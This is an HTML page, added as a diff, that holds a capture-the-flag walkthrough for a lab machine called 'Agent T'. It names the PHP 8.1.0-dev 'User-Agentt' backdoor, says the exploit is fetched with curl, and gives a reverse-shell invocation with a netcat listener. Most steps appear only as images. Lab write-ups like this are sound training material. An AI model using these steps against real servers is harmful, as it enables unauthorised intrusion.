@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+   <head>
+      <!-- basic -->
+      <meta charset="utf-8">
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <!-- mobile metas -->
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <meta name="viewport" content="initial-scale=1, maximum-scale=1">
+      <!-- site metas -->
+      <title>Agent T</title>
+      <meta name="keywords" content="">
+      <meta name="description" content="">
+      <meta name="author" content="">
+      <!-- bootstrap css -->
+      <link rel="stylesheet" href="css/bootstrap.min.css">
+      <!-- style css -->
+      <link rel="stylesheet" href="css/style.css">
+      <!-- Responsive-->
+      <link rel="stylesheet" href="css/responsive.css">
+      <!-- fevicon -->
+      <link rel="icon" href="/machines/images/agenttimages/icon.png" type="image/gif" />
+      <!-- Scrollbar Custom CSS -->
+      <link rel="stylesheet" href="css/jquery.mCustomScrollbar.min.css">
+      <!-- Tweaks for older IEs-->
+      <link rel="stylesheet" href="https://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css">
+      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.css" media="screen">
+      
+   </head>
+   <!-- body -->
+   <body class="main-layout">
+      <!-- loader  -->
+      <div class="loader_bg">
+         <div class="loader"><img src="/machines/images/loading.gif" alt="#" /></div>
+      </div>
+      <!-- end loader -->
+      <!-- header -->
+      <header>
+         <!-- header inner -->
+         <div class="header">
+            <div class="container">
+               <div class="row">
+                  <div class="col-xl-3 col-lg-3 col-md-3 col-sm-3 col logo_section">
+                     <div class="full">
+                        <div class="center-desk">
+                           <div class="logo">
+                              <a href="/index"><img src="/images/logo.PNG" alt="#" /></a>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+                  <div class="col-xl-9 col-lg-9 col-md-9 col-sm-9">
+                     <nav class="navigation navbar navbar-expand-md navbar-dark ">
+                        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExample04" aria-controls="navbarsExample04" aria-expanded="false" aria-label="Toggle navigation">
+                        <span class="navbar-toggler-icon"></span>
+                        </button>
+                        <div class="collapse navbar-collapse" id="navbarsExample04">
+                           <ul class="navbar-nav mr-auto">
+                              <li class="nav-item active">
+                                 <a class="nav-link" href="/index">Home</a>
+                              </li>
+                              <li class="nav-item">
+                                 <a class="nav-link" href="/machines"> Machines</a>
+                              </li>
+							  <li class="nav-item">
+                                 <a class="nav-link" href="/tools"> Tools</a>
+                              </li>
+                           </ul>
+                        </div>
+                     </nav>
+                  </div>
+               </div>
+            </div>
+         </div>
+      </header>
+      <!-- end header inner -->
+      <!-- end header -->
+      <!-- Machine -->
+      <div class="hosting">
+         <div class="container">
+            <div class="row">
+               <div class="col-md-12">
+                  </div>
+               </div>
+            </div>
+            <div class>
+               <div class="col-md-12">
+                  <div class="web_hosting">
+				  <figure><img  src="/machines/images/agenttimages/0.png"/></figure>&nbsp;
+				  
+					<h5>Nmap Output:</h5>&nbsp;
+					 
+					 <figure><img  src="/machines/images/agenttimages/1.png"/></figure>&nbsp;
+					 <h6>When we look at the Nmap output and the --head information of the page, we see that it is PHP version is 8.1.0</h6>&nbsp;
+					 <figure><img  src="/machines/images/agenttimages/2.png"/></figure>&nbsp;
+					 <h6>When we search for vulnerabilities for PHP 8.1.0, we see that there is a Backdoor Remote Code Execution vulnerability. (RCE)</h6>&nbsp;
+					 <h6>There are two ways to become a Shell. First:</h6>&nbsp;
+					 <h5>PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution</h5>&nbsp;
+					 
+					 <figure><img  src="/machines/images/agenttimages/3.png"/></figure>&nbsp;
+					 <h6>We can download the exploit with Curl</h6>&nbsp;
+					 <figure><img  src="/machines/images/agenttimages/4.png"/></figure>&nbsp;
+					 
+					 <h6>We are root.</h6>&nbsp;
+					 <figure><img  src="/machines/images/agenttimages/5.png"/></figure>&nbsp;
+					 
+					 <h6>Commands are executed when written on a single line.</h6>&nbsp;
+					 <figure><img  src="/machines/images/agenttimages/6.png"/></figure>&nbsp;
+					 
+					 <h6>/root/root.txt dosyasını okumaya çalıştım ama bayrak orada değil.</h6>&nbsp;
+					 <h6>Then let's search for .txt files with the “find” command.</h6>&nbsp;
+					 <figure><img  src="/machines/images/agenttimages/7.png"/></figure>&nbsp;
+					 
+					 <h6>We can see that our Flag is in the home directory.</h6>&nbsp;
+					 <h6>Then let's move on to the second way</h6>&nbsp;
+					 <h5>Reverse Shell</h5>&nbsp;
+					 <figure><img  src="/machines/images/agenttimages/8.png"/></figure>&nbsp;
+					 
+					 <p>python3 exploit.py http://[TARGET_IP] [LHOST] [LPORT]</p>&nbsp;
+					 <h6>also dont forget nc </h6>&nbsp;
+					 <figure><img  src="/machines/images/agenttimages/9.png"/></figure>&nbsp;
+					 <h6>Since we know the location of the flag, we can read it directly.</h6>&nbsp;
+					 <figure><img  src="/machines/images/agenttimages/10.png"/></figure>&nbsp;
+					 
+                  </div>
+               </div>
+            </div>
+         </div>
+      </div>
+      <!-- end Machine -->
+
+      <!-- Javascript files-->
+      <script src="js/jquery.min.js"></script>
+      <script src="js/popper.min.js"></script>
+      <script src="js/bootstrap.bundle.min.js"></script>
+      <script src="js/jquery-3.0.0.min.js"></script>
+      <script src="js/plugin.js"></script>
+      <!-- sidebar -->
+      <script src="js/jquery.mCustomScrollbar.concat.min.js"></script>
+      <script src="js/custom.js"></script>
+      <script src="https:cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.js"></script>
+   </body>
+</html>
